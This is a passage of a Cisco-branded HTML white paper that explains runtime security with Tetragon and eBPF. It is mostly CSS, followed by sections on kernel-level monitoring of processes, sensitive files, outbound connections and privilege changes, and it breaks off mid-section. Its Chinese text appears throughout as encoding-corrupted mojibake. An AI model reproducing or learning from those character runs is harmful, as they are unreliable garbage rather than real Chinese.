<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cisco Security Insight: Tetragon & eBPF Comprehensive Guide</title>
    <style>
        /* --- Cisco Brand Identity System --- */
        :root {
            --cisco-blue: #049FD9;
            --cisco-midnight: #0D274D;
            --cisco-sky: #6ABF4B;
            --cisco-slate: #58585B;
            --cisco-light-gray: #F2F2F2;
            --cisco-platinum: #E4E4E4;
            --cisco-green: #6CC24A;
            --cisco-red: #E2231A;
            --cisco-orange: #F58025;
            --white: #FFFFFF;
            --shadow-card: 0 8px 24px rgba(13, 39, 77, 0.08);
            --shadow-hover: 0 12px 32px rgba(13, 39, 77, 0.15);
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 16px;
        }

        /* --- Typography & Base --- */
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        
        body {
            font-family: "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: var(--cisco-slate);
            background-color: #FAFAFA;
            line-height: 1.6;
        }

        h1, h2, h3, h4 { color: var(--cisco-midnight); font-weight: 700; letter-spacing: -0.5px; }
        p { margin-bottom: 1.2rem; font-size: 1.05rem; }
        
        /* --- Language Toggling --- */
        body.lang-zh .lang-en { display: none !important; }
        body.lang-en .lang-zh { display: none !important; }

        .lang-switch {
            position: absolute; top: 20px; right: 20px; z-index: 100;
            background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 20px; padding: 4px; display: flex; backdrop-filter: blur(4px);
        }

        .lang-btn {
            background: transparent; border: none; color: rgba(255, 255, 255, 0.7);
            padding: 6px 16px; border-radius: 16px; font-size: 0.85rem; font-weight: 600;
            cursor: pointer; transition: all 0.2s;
        }

        .lang-btn.active { background: white; color: var(--cisco-midnight); box-shadow: 0 2px 8px rgba(0,0,0,0.2); }

        /* --- Layout --- */
        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
        section { padding: 80px 0; border-bottom: 1px solid var(--cisco-platinum); background: var(--white); }
        section:nth-child(even) { background: #F9FAFB; }

        /* --- Header / Hero --- */
        header {
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white; padding: 100px 0 80px; position: relative;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%);
        }

        .hero-tag {
            background: rgba(255,255,255,0.1); color: #61C6E2; padding: 6px 16px;
            border-radius: 20px; font-size: 0.85rem; font-weight: 600;
            text-transform: uppercase; letter-spacing: 1px; display: inline-block;
            margin-bottom: 24px; border: 1px solid rgba(4, 159, 217, 0.3);
        }

        h1 { color: white; font-size: 3rem; margin-bottom: 20px; line-height: 1.1; }
        .hero-sub { font-size: 1.25rem; color: rgba(255,255,255,0.85); max-width: 700px; margin-bottom: 40px; }

        /* --- Winston's Promise Block --- */
        .winston-promise {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            padding: 20px;
            border-radius: 12px;
            margin-top: 30px;
            display: flex;
            align-items: center;
            gap: 20px;
            backdrop-filter: blur(10px);
        }

        /* --- Section Titles --- */
        .section-header { text-align: center; max-width: 850px; margin: 0 auto 60px; }
        .section-header h2 { font-size: 2.25rem; margin-bottom: 16px; position: relative; display: inline-block; }
        .section-header h2::after {
            content: ''; display: block; width: 60px; height: 4px; background: var(--cisco-blue);
            margin: 12px auto 0; border-radius: 2px;
        }

        /* --- Grid & Cards --- */
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 32px; }
        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 24px; }
        
        .grid-monitoring { 
            display: flex; 
            flex-wrap: wrap; 
            gap: 24px; 
            justify-content: center; 
        }
        .grid-monitoring .card {
            flex: 1 1 calc(33.333% - 24px);
            min-width: 300px;
        }
        .grid-monitoring .card.special-feat {
            border-top: 4px solid var(--cisco-sky);
            background: linear-gradient(to bottom, #FFFFFF, #F8FAFC);
        }

        .grid-2x2 { 
            display: grid; 
            grid-template-columns: repeat(2, 1fr); 
            gap: 20px; 
        }

        .card {
            background: white; padding: 35px 28px; border-radius: var(--radius-lg);
            box-shadow: var(--shadow-card); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border-top: 4px solid transparent; height: 100%;
        }
        .card:hover { transform: translateY(-8px); box-shadow: var(--shadow-hover); border-top-color: var(--cisco-blue); }
        
        .definition-card {
            background: white; padding: 20px; border-radius: var(--radius-md);
            border: 1px solid var(--cisco-platinum); border-left: 4px solid var(--cisco-blue);
        }

        /* Sequential Perspectives Styles */
        .view-section { margin-bottom: 60px; }
        .view-title { 
            color: var(--cisco-midnight); font-size: 1.6rem; margin-bottom: 25px; 
            border-bottom: 2px solid var(--cisco-platinum); padding-bottom: 10px;
            display: flex; align-items: center; gap: 12px;
        }
        .view-title::before { content: ""; display: block; width: 4px; height: 1.2em; background: var(--cisco-blue); border-radius: 2px; }

        .highlight-box {
            background: #F0F7FA; border-left: 4px solid var(--cisco-blue);
            padding: 25px; border-radius: 0 var(--radius-md) var(--radius-md) 0;
            margin: 30px 0;
        }

        /* Ancestry Tree Styles */
        .ancestry-container {
            display: flex; flex-direction: column; align-items: flex-start;
            padding: 40px; background: #F8FAFC; border-radius: 12px;
            border: 1px dashed var(--cisco-platinum); position: relative;
        }
        .ancestry-node {
            display: flex; align-items: center; gap: 15px;
            background: white; padding: 12px 20px; border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 30px;
            border: 1px solid var(--cisco-platinum); position: relative;
            min-width: 280px; z-index: 2;
        }
        .ancestry-node::after {
            content: ''; position: absolute; left: 35px; top: 100%;
            width: 2px; height: 30px; background: var(--cisco-blue);
        }
        .ancestry-node:last-child::after { display: none; }
        .ancestry-node.alert { border: 2px solid var(--cisco-red); background: #FFF5F5; }
        .ancestry-node.alert::after { background: var(--cisco-red); }
        .node-icon { 
            width: 32px; height: 32px; border-radius: 6px; 
            display: flex; align-items: center; justify-content: center;
            background: var(--cisco-midnight); color: white;
        }
        .node-info { flex: 1; }
        .node-name { font-weight: 700; font-size: 0.9rem; color: var(--cisco-midnight); }
        .node-meta { font-size: 0.75rem; color: var(--cisco-slate); }
        .node-tag { 
            font-size: 10px; padding: 2px 6px; border-radius: 4px; 
            background: var(--cisco-light-gray); margin-left: auto;
            text-transform: uppercase; font-weight: bold;
        }

        /* Policy Discovery Interactive Styles */
        .discovery-card {
            background: #FFFFFF; border: 1px solid var(--cisco-platinum);
            border-radius: 12px; padding: 0; overflow: hidden;
            display: grid; grid-template-columns: 1.2fr 1fr; gap: 0;
            box-shadow: var(--shadow-card); margin-bottom: 40px;
        }
        .log-side { background: #1A1F2B; padding: 25px; color: #ADBAC7; font-family: 'Courier New', monospace; font-size: 0.85rem; border-right: 1px solid #30363D; }
        .policy-side { background: #FFFFFF; padding: 25px; position: relative; }
        .log-line { margin-bottom: 10px; border-left: 2px solid #444; padding-left: 12px; opacity: 0.7; transition: all 0.3s; }
        .log-line.highlight { opacity: 1; border-left-color: var(--cisco-blue); background: rgba(4, 159, 217, 0.1); }
        .policy-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; }
        
        .pulse-wave { animation: pulse-border 2s infinite; }
        @keyframes pulse-border {
            0% { box-shadow: 0 0 0 0 rgba(108, 194, 74, 0.4); }
            70% { box-shadow: 0 0 0 15px rgba(108, 194, 74, 0); }
            100% { box-shadow: 0 0 0 0 rgba(108, 194, 74, 0); }
        }

        .yaml-transfer { animation: slide-up 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        @keyframes slide-up {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* Mechanism Description Blocks */
        .mechanism-card {
            background: #FFFFFF; border: 1px solid var(--cisco-platinum);
            border-radius: 12px; padding: 35px; margin-bottom: 40px;
            box-shadow: var(--shadow-card);
            position: relative;
        }
        .mechanism-card h4 { color: var(--cisco-blue); margin-bottom: 15px; border-left: 4px solid var(--cisco-blue); padding-left: 15px; font-size: 1.4rem; }

        /* Linux Terminal */
        .terminal {
            background: #111111; border-radius: var(--radius-md); overflow: hidden;
            font-family: 'Courier New', monospace; box-shadow: 0 20px 50px rgba(0,0,0,0.3); margin-top: 20px;
            border: 1px solid #333; transition: all 0.2s; position: relative;
        }
        .terminal-bar { background: #2A2A2A; padding: 12px; display: flex; gap: 8px; align-items: center; }
        .traffic-light { width: 12px; height: 12px; border-radius: 50%; }
        .traffic-light.red { background: #ff5f56; }
        .traffic-light.yellow { background: #ffbd2e; }
        .traffic-light.green { background: #27c93f; }
        .terminal-content { padding: 20px; min-height: 250px; color: #EEE; font-size: 14px; overflow-y: auto; z-index: 2; position: relative; }
        .prompt { color: var(--cisco-green); font-weight: bold; }
        .alert-text { color: var(--cisco-red); font-weight: bold; background: rgba(226, 35, 26, 0.1); padding: 2px 6px; border-radius: 4px; }
        .cursor { display: inline-block; width: 10px; height: 18px; background: #CCC; animation: blink 1s infinite; vertical-align: middle;}
        @keyframes blink { 50% { opacity: 0; } }

        /* Code & YAML Blocks */
        .yaml-block {
            background: #1E1E1E; border-radius: var(--radius-md); padding: 24px;
            font-family: 'Consolas', monospace; font-size: 0.9rem; color: #D4D4D4;
            border-left: 4px solid var(--cisco-green); overflow-x: auto; white-space: pre; margin: 20px 0;
        }
        .yaml-key { color: #569CD6; font-weight: bold; }
        .yaml-val { color: #CE9178; }
        .yaml-action { color: #C586C0; font-weight: bold; }

        /* Dashboard Mockup */
        .dashboard-mock {
            background: #1C222D; border-radius: 12px; padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3); margin-top: 30px;
        }
        .dash-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        .dash-widget { background: #262E3D; border-radius: 8px; padding: 15px; display: flex; flex-direction: column; min-height: 100px; border: 1px solid rgba(255,255,255,0.05); }
        .dash-label { color: #888; font-size: 0.75rem; margin-bottom: 5px; }
        .dash-value { color: var(--cisco-blue); font-size: 1.6rem; font-weight: bold; margin-top: auto; }

        /* Expert Perspective Box */
        .expert-persp-box {
            background: linear-gradient(to right, #0D274D, #005073);
            color: white; padding: 30px; border-radius: 12px; margin-top: 40px;
            position: relative; overflow: hidden;
            border-left: 5px solid var(--cisco-orange);
        }
        .expert-persp-box::after {
            content: "DEEP DIVE"; position: absolute; top: 10px; right: -30px;
            background: var(--cisco-orange); font-size: 10px; font-weight: bold;
            padding: 5px 40px; transform: rotate(45deg);
        }

        /* Final Conclusion Section */
        .final-conclusion { 
            background-color: var(--cisco-midnight) !important; 
            padding: 100px 0; 
            color: #FFFFFF !important; 
            border-bottom: none;
        }
        .final-conclusion h2 { 
            color: #FFFFFF !important; 
            text-align: center; 
            margin-bottom: 40px; 
            font-size: 2.5rem; 
        }
        .final-conclusion h2::after { 
            content: ''; display: block; width: 80px; height: 4px; background: var(--cisco-blue); margin: 20px auto 0;
        }
        .conclusion-core { 
            color: #FFFFFF !important; 
            font-size: 1.35rem; 
            max-width: 900px; 
            margin: 0 auto 60px; 
            text-align: center; 
            line-height: 1.8; 
            font-weight: 500;
            background: rgba(255,255,255,0.05);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .conclusion-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
            gap: 40px; 
            max-width: 1000px; 
            margin: 0 auto; 
        }
        .conclusion-item { 
            background: rgba(255,255,255,0.08); 
            padding: 35px; 
            border-radius: 16px; 
            border: 1px solid rgba(255,255,255,0.15); 
        }
        .conclusion-item strong { 
            color: var(--cisco-blue); 
            display: block; 
            margin-bottom: 15px; 
            font-size: 1.25rem; 
        }
        .conclusion-item p { 
            color: #FFFFFF !important; 
            font-size: 1.05rem; 
            margin-bottom: 0; 
            opacity: 0.95;
            line-height: 1.6;
        }

        /* CASE BADGE */
        .case-badge { 
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white; 
            padding: 5px 16px; 
            border-radius: 50px; 
            font-size: 0.75rem; 
            font-weight: 700; 
            margin-bottom: 15px; 
            display: inline-block; 
            text-transform: uppercase; 
            letter-spacing: 1.2px;
            border: 1px solid rgba(4, 159, 217, 0.4);
            box-shadow: 0 4px 10px rgba(13, 39, 77, 0.2);
            position: relative;
        }

        /* MITRE TAG STYLES */
        .mitre-tag {
            font-size: 0.7rem;
            background: rgba(4, 159, 217, 0.1);
            color: var(--cisco-blue);
            padding: 3px 8px;
            border-radius: 4px;
            font-weight: bold;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 10px;
            border: 1px solid rgba(4, 159, 217, 0.2);
        }

        /* IDENTITY SECTION STYLES */
        .identity-box {
            background: #FFFFFF;
            border-radius: var(--radius-lg);
            padding: 40px;
            margin: 40px 0;
            border: 1px solid var(--cisco-platinum);
            display: flex;
            gap: 40px;
            align-items: center;
        }
        .identity-visual {
            flex: 1;
            background: #F8FAFC;
            padding: 30px;
            border-radius: 12px;
            border: 2px dashed #CBD5E1;
        }

        /* PIPELINE STYLES */
        .pipeline-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 40px 0;
            gap: 20px;
        }
        .pipeline-node {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: var(--shadow-card);
            flex: 1;
            text-align: center;
            border-bottom: 4px solid var(--cisco-blue);
        }

        /* MTTR CARD */
        .mttr-card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: var(--shadow-card);
            margin-top: 30px;
            border-left: 5px solid var(--cisco-green);
        }
        .mttr-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 15px;
        }
        .mttr-stat {
            background: #F8FAFC;
            padding: 15px;
            border-radius: 8px;
        }

        /* DATA SOURCE FOOTNOTE */
        .data-source-footnote {
            margin-top: 20px;
            font-size: 0.75rem;
            color: var(--cisco-slate);
            font-style: italic;
            border-top: 1px solid var(--cisco-platinum);
            padding-top: 10px;
            opacity: 0.8;
        }

        /* TERMINAL ENHANCEMENT STYLES */
        .login-info { color: #888; font-size: 0.8rem; margin-bottom: 12px; }
        .json-log-view {
            font-size: 0.75rem;
            color: #888;
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 4px;
            margin: 12px 0;
            border-left: 2px solid var(--cisco-blue);
            font-family: 'Courier New', monospace;
        }
        .terminal-output-line { margin: 8px 0; }

        /* TABS FOR INSTALLATION */
        .tab-container { margin: 20px 0; }
        .tab-header { display: flex; gap: 10px; margin-bottom: 15px; }
        .tab-btn { 
            padding: 8px 20px; border-radius: 20px; border: 1px solid var(--cisco-platinum); 
            background: white; cursor: pointer; font-weight: 600; color: var(--cisco-slate);
            transition: all 0.2s;
        }
        .tab-btn.active { background: var(--cisco-midnight); color: white; border-color: var(--cisco-midnight); }

        /* ENFORCEMENT STATUS BADGE */
        .enforcement-status {
            position: absolute; top: 35px; right: 35px;
            padding: 4px 12px; border-radius: 4px; font-size: 0.7rem; font-weight: bold;
            display: flex; align-items: center; gap: 6px;
            background: #EEE; color: #888; border: 1px solid #DDD;
            transition: all 0.4s ease;
        }
        .enforcement-status.active {
            background: rgba(4, 159, 217, 0.1); color: var(--cisco-blue); border-color: var(--cisco-blue);
        }
        .status-dot { width: 6px; height: 6px; border-radius: 50%; background: #888; }
        .enforcement-status.active .status-dot { 
            background: var(--cisco-blue); 
            box-shadow: 0 0 8px var(--cisco-blue);
            animation: pulse-dot 1.5s infinite;
        }
        @keyframes pulse-dot { 
            0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; }
        }

        /* SHIELD WATERMARK */
        .shield-watermark {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 150px; height: 150px; opacity: 0; pointer-events: none;
            z-index: 1; transition: opacity 0.5s;
        }
        .shield-watermark svg { fill: rgba(108, 194, 74, 0.1); }
        .shield-active .shield-watermark { opacity: 1; }

        /* PERFORMANCE PANEL */
        .perf-insight-panel {
            background: #FFFFFF; border-radius: 12px; padding: 25px;
            margin-top: 30px; border: 1px solid var(--cisco-platinum);
            display: flex; gap: 30px; align-items: center;
        }
        .perf-bar-chart { flex: 1; display: flex; flex-direction: column; gap: 15px; }
        .perf-bar-item { width: 100%; }
        .perf-label { font-size: 0.8rem; margin-bottom: 4px; display: flex; justify-content: space-between; }
        .perf-track { height: 8px; background: #F2F2F2; border-radius: 4px; overflow: hidden; }
        .perf-fill { height: 100%; border-radius: 4px; transition: width 1s; }

        /* ROADMAP STYLES */
        .roadmap-container { display: flex; gap: 20px; margin: 40px 0; }
        .roadmap-step { 
            flex: 1; background: white; padding: 25px; border-radius: 12px; 
            border: 1px solid var(--cisco-platinum); position: relative;
            box-shadow: var(--shadow-card);
        }
        .roadmap-step::after {
            content: "â†’"; position: absolute; right: -15px; top: 50%; transform: translateY(-50%);
            font-size: 1.5rem; color: var(--cisco-platinum);
        }
        .roadmap-step:last-child::after { display: none; }
        .step-num { width: 24px; height: 24px; background: var(--cisco-blue); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; margin-bottom: 15px; }

        /* Architecture Overview Specific Styles */
        .arch-split-container { display: flex; gap: 24px; margin-top: 30px; }
        .arch-col { 
            flex: 1; padding: 30px; border-radius: var(--radius-lg); 
            background: var(--white); border: 1px solid var(--cisco-platinum);
            box-shadow: var(--shadow-card);
        }
        .arch-col.kernel { border-top: 4px solid var(--cisco-midnight); }
        .arch-col.user { border-top: 4px solid var(--cisco-blue); }
        .arch-col h3 { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; font-size: 1.25rem; }
        .arch-list { list-style: none; margin-top: 20px; }
        .arch-list li { margin-bottom: 12px; font-size: 0.9rem; position: relative; padding-left: 20px; }
        .arch-list li::before { 
            content: "â€¢"; color: var(--cisco-blue); font-weight: bold; 
            position: absolute; left: 0; 
        }
        .coordination-banner {
            background: #F0F7FA; border: 1px solid rgba(4, 159, 217, 0.2);
            padding: 30px; border-radius: var(--radius-lg); margin-top: 40px;
        }

        /* Winston's Star Badge */
        .star-badge {
            background: var(--cisco-midnight);
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: bold;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 10px;
        }

        /* [NEW] Quick Insights Style */
        .winston-bridge {
            font-style: italic; color: var(--cisco-slate); border-left: 3px solid var(--cisco-platinum);
            padding-left: 15px; margin: 20px 0; font-size: 0.95rem; line-height: 1.4;
        }

        @media (max-width: 768px) {
            h1 { font-size: 2.2rem; }
            .grid-3, .grid-4, .grid-monitoring, .grid-2x2, .dash-grid, .perf-insight-panel, .roadmap-container, .arch-split-container { grid-template-columns: 1fr; flex-direction: column; }
            .final-conclusion { padding: 60px 0; }
            .discovery-card { grid-template-columns: 1fr; }
            .identity-box, .mttr-grid { flex-direction: column; grid-template-columns: 1fr; }
            .roadmap-step::after { content: "â†“"; right: 50%; top: auto; bottom: -20px; transform: translateX(50%); }
        }
    </style>
</head>
<body class="lang-zh">

    <!-- Hero Section -->
    <header>
        <div class="lang-switch">
            <button class="lang-btn active" id="btn-zh" onclick="setLanguage('zh')">ä¸­æ–‡</button>
            <button class="lang-btn" id="btn-en" onclick="setLanguage('en')">EN</button>
        </div>
        <div class="container">
            <div class="hero-tag">Cisco Technology Radar: eBPF & Tetragon</div>
            <h1>
                <span class="lang-zh">Tetragon:<br>äº‘åŸç”Ÿå®‰å…¨çš„æœ€åä¸€é“é˜²çº¿</span>
                <span class="lang-en">Tetragon:<br>The Final Line of Defense for<br>Cloud-Native Security</span>
            </h1>
            <p class="hero-sub">
                <span class="lang-zh">åœ¨ç°ä»£åŒ–çš„ IT æ¶æ„ä¸­ï¼Œå¤–å›´é˜²ç«å¢™å·²ä¸è¶³åŠåº”å¯¹å¨èƒã€‚Tetragon åˆ©ç”¨ eBPF æŠ€æœ¯ï¼Œå°†å®‰å…¨é˜²å¾¡ä¸‹æ²‰è‡³ Linux å†…æ ¸æœ€æ·±å¤„ï¼Œå®ç°çœŸæ­£çš„äºšæ¯«ç§’çº§å®æ—¶é˜»æ–­ã€‚</span>
                <span class="lang-en">In modern IT architectures, perimeter firewalls are no longer enough. Tetragon utilizes eBPF technology to embed security deep into the Linux kernel for true real-time enforcement.</span>
            </p>
            
            <!-- Winston's Promise Block -->
            <div class="winston-promise">
                <div style="font-size: 2rem;">ğŸ’¡</div>
                <div>
                    <strong>ä»Šæ—¥æ‰¿è¯º (The Promise):</strong>
                    <p style="margin:0; font-size: 0.95rem; color: rgba(255,255,255,0.9);">
                        é˜…è¯»æœ¬ç™½çš®ä¹¦åï¼Œä½ å°†ç†è§£å¦‚ä½•åˆ©ç”¨ eBPF å°†é˜²å¾¡å»¶è¿Ÿä»åˆ†é’Ÿçº§é™ä½è‡³å¾®ç§’çº§ï¼Œå¹¶æŒæ¡åœ¨ä¸ä¾µå…¥åº”ç”¨ä»£ç çš„å‰æä¸‹å®ç°â€œé›¶ä¿¡ä»»è¿è¡Œæ—¶â€çš„å®æˆ˜æ–¹æ³•ã€‚
                    </p>
                </div>
            </div>

            <div style="display:flex; gap:16px; margin-top: 30px;">
                <button class="btn-primary" onclick="scrollToId('lab-section')" style="background: var(--cisco-blue); color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer;">å¯åŠ¨æ¼”ç»ƒå®éªŒå®¤</button>
                <button class="btn-outline" style="background: transparent; border: 2px solid white; color: white; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer;" onclick="scrollToId('how-it-works')">æŠ€æœ¯åŸç†</button>
            </div>
        </div>
    </header>

    <!-- Section 1: Definition & Dimensions -->
    <section id="what-is-runtime">
        <div class="container">
            <!-- Winston's Roadmap Hint -->
            <p style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 20px;">[ 1/4: å»ºç«‹å…±è¯† ]</p>
            
            <div class="section-header">
                <h2>ä»€ä¹ˆæ˜¯è¿è¡Œæ—¶å®‰å…¨ï¼Ÿ</h2>
                <p>è¿è¡Œæ—¶å®‰å…¨æ˜¯æŒ‡åœ¨åº”ç”¨ç¨‹åº<b>æ‰§è¡Œè¿‡ç¨‹ä¸­</b>å¯¹å…¶è¿›è¡Œç›‘æ§å’Œé˜²æŠ¤ã€‚å®ƒå…³æ³¨çš„æ˜¯â€œç°åœ¨æ­£åœ¨å‘ç”Ÿä»€ä¹ˆâ€ï¼Œè€Œä¸æ˜¯ä»£ç åœ¨æ„å»ºæ—¶æ˜¯ä»€ä¹ˆæ ·å­ã€‚</p>
            </div>

            <div class="view-section">
                <div class="highlight-box">
                    <strong>æ ¸å¿ƒä»·å€¼ï¼šå¼¥è¡¥â€œå·¦ç§»å®‰å…¨â€çš„ç›²åŒº</strong>
                    <p>å³ä½¿é•œåƒæ‰«æå’Œé™æ€é…ç½®åˆ†æï¼ˆShift Leftï¼‰æ˜¯å®Œç¾çš„ï¼Œä¹Ÿæ— æ³•è¦†ç›– 0-day æ¼æ´åˆ©ç”¨ã€ä¾›åº”é“¾æ±¡æŸ“æˆ–è¿è¡Œæ—¶çš„ç‰¹æƒæå‡ã€‚è¿è¡Œæ—¶å®‰å…¨æä¾› <b>â€œShield Rightâ€</b>ï¼Œåœ¨æ¶æ„è¡Œä¸ºå‘ç”Ÿçš„ç¬é—´æ„å»ºæœ€åä¸€é“é˜²çº¿ã€‚</p>

                    <!-- [WINSTON ADDITION: The Bridge] -->
                    <div class="winston-bridge">
                        <strong>é€»è¾‘æ¡¥æ¢ï¼š</strong> æ—¢ç„¶æ¼æ´ä¸å¯é¿å…åœ°ä¼šè¿›å…¥ç”Ÿäº§ç¯å¢ƒï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ‰§è¡Œè·¯å¾„ä¸Šå®‰ç½®â€œå…³å¡â€ã€‚
                    </div>

                    <div class="grid-3" style="margin-top: 30px;">
                        <div class="definition-card">
                            <strong>å·¦ç§»å®‰å…¨ (Shift Left)</strong>
                            <p style="font-size: 0.9rem; margin-top:10px;">å°†å®‰å…¨æ£€æŸ¥å‰ç§»åˆ°å¼€å‘é˜¶æ®µã€‚é€šè¿‡ä»£ç æ‰«æã€é•œåƒå®¡è®¡å‘ç°å·²çŸ¥ç¼ºé™·ï¼Œé˜²æ‚£äºæœªç„¶ã€‚</p>
                        </div>
                        <div class="definition-card" style="border-color: var(--cisco-midnight);">
                            <strong>è¿è¡Œæ—¶ç›¾ç‰Œ (Shield Right)</strong>
                            <p style="font-size: 0.9rem; margin-top:10px;">åœ¨ç”Ÿäº§è¿è¡Œé˜¶æ®µæ„å»ºå®æ—¶å±éšœã€‚åº”å¯¹é‚£äº›ç»•è¿‡å¼€å‘é˜¶æ®µæ£€æŸ¥çš„æœªçŸ¥å¨èƒï¼ˆ0-dayï¼‰æˆ–å†…éƒ¨ç ´åã€‚</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="view-section">
                <div class="view-title">ä¸»è¦ç›‘æ§ç»´åº¦</div>
                <div class="grid-monitoring">
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>è¿›ç¨‹æ‰§è¡Œ</strong>
                        <p style="font-size: 0.9rem;">è¿½è¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„å…¨ç”Ÿå‘½å‘¨æœŸï¼šè°å¯åŠ¨äº†ç¨‹åºï¼Ÿæ˜¯å¦æ´¾ç”Ÿäº†éæ³•çš„å­è¿›ç¨‹æˆ– Shellï¼Ÿ</p>
                    </div>
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>æ–‡ä»¶è®¿é—®</strong>
                        <p style="font-size: 0.9rem;">ç›‘æ§å…³é”®è·¯å¾„ï¼šæ•æ„Ÿé…ç½®æ–‡ä»¶ï¼ˆå¦‚ <code>/etc/shadow</code>ï¼‰æ˜¯å¦è¢«æœªæˆæƒç¯¡æ”¹æˆ–éæ³•è¯»å–ï¼Ÿ</p>
                    </div>
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>ç½‘ç»œé€šä¿¡</strong>
                        <p style="font-size: 0.9rem;">æ„ŸçŸ¥è¿æ¥æ„å›¾ï¼šè¿›ç¨‹æ˜¯å¦å»ºç«‹äº†éé¢„æœŸçš„å¤–è¿æˆ–å°è¯•è®¿é—®æ¶æ„çš„ C2 åŸŸåï¼Ÿ</p>
                    </div>
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>ç‰¹æƒå˜æ›´</strong>
                        <p style="font-size: 0.9rem;">è¯†åˆ«è¶Šæƒè¡Œä¸ºï¼šæ™®é€šç”¨æˆ·è¿›ç¨‹æ˜¯å¦çªç„¶ææƒå˜æˆ Rootï¼Ÿæ˜¯å¦å‘ç”Ÿäº†å¼‚å¸¸çš„ Capability å˜æ›´ï¼Ÿ</p>
                    </div>
                    <div class="card special-feat">
                        <strong>L7 åè®®è§£æ</strong>
                        <p style="font-size: 0.9rem;"><b>[æ–°ç‰¹æ€§]</b> æ— éœ€ Sidecar å³å¯åœ¨å†…æ ¸æ„ŸçŸ¥ HTTP/DNS/TLS å…ƒæ•°æ®ã€‚å®ç°æ·±åº¦çš„åº”ç”¨å±‚åè®®è§‚æµ‹ä¸å…³è”ã€‚</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 2: Tetragon & TracingPolicy -->
    <section id="what-is-tetragon" style="background: #F9FAFB;">
        <div class="container">
            <!-- Winston's Roadmap Hint -->
            <p style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 20px;">[ 2/4: å·¥å…·è§£æ„ ]</p>

            <div class="section-header">
                <h2>ä»€ä¹ˆæ˜¯ Tetragon?</h2>
                <p>Tetragon æ˜¯ Cilium å¼€æºç¤¾åŒºä¸‹çš„æ ¸å¿ƒé¡¹ç›®ï¼Œå®ƒåˆ©ç”¨ <b>eBPF</b> æŠ€æœ¯æä¾›æ·±åº¦çš„å†…æ ¸çº§å®‰å…¨è§‚æµ‹ã€‚ä¸åŒäºä¼ ç»Ÿçš„å®‰å…¨å·¥å…·ï¼Œå®ƒèƒ½æ„ŸçŸ¥ <b>Kubernetes èº«ä»½</b>ï¼ˆPod, Namespace, Labelsï¼‰ï¼Œå¹¶åœ¨æ¶æ„è¡Œä¸ºå‘ç”Ÿçš„ç¬é—´åœ¨å†…æ ¸æ€å°†å…¶é˜»æ–­ã€‚ä¼ ç»Ÿå®‰å…¨ä¾èµ–ç”¨æˆ·æ€ Agentï¼Œå®¹æ˜“è¢«ç»•è¿‡ã€‚Tetragon æŒ‚è½½åœ¨å†…æ ¸æ‰§è¡Œè·¯å¾„çš„æ ¸å¿ƒç‚¹ï¼ˆå¦‚ LSM æˆ–ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼‰ï¼Œæä¾›â€œä¸å¯ç»•è¿‡â€çš„å®¡è®¡ä¸€è‡´æ€§ã€‚</p>
            </div>

            <!-- Winston's Star Badge Added -->
            <div style="text-align: center; margin-bottom: 40px;">
                <div class="star-badge">âœ¨ æ ¸å¿ƒç‚¹ (The Star): å†…æ ¸æ€åŒæ­¥é˜»æ–­</div>
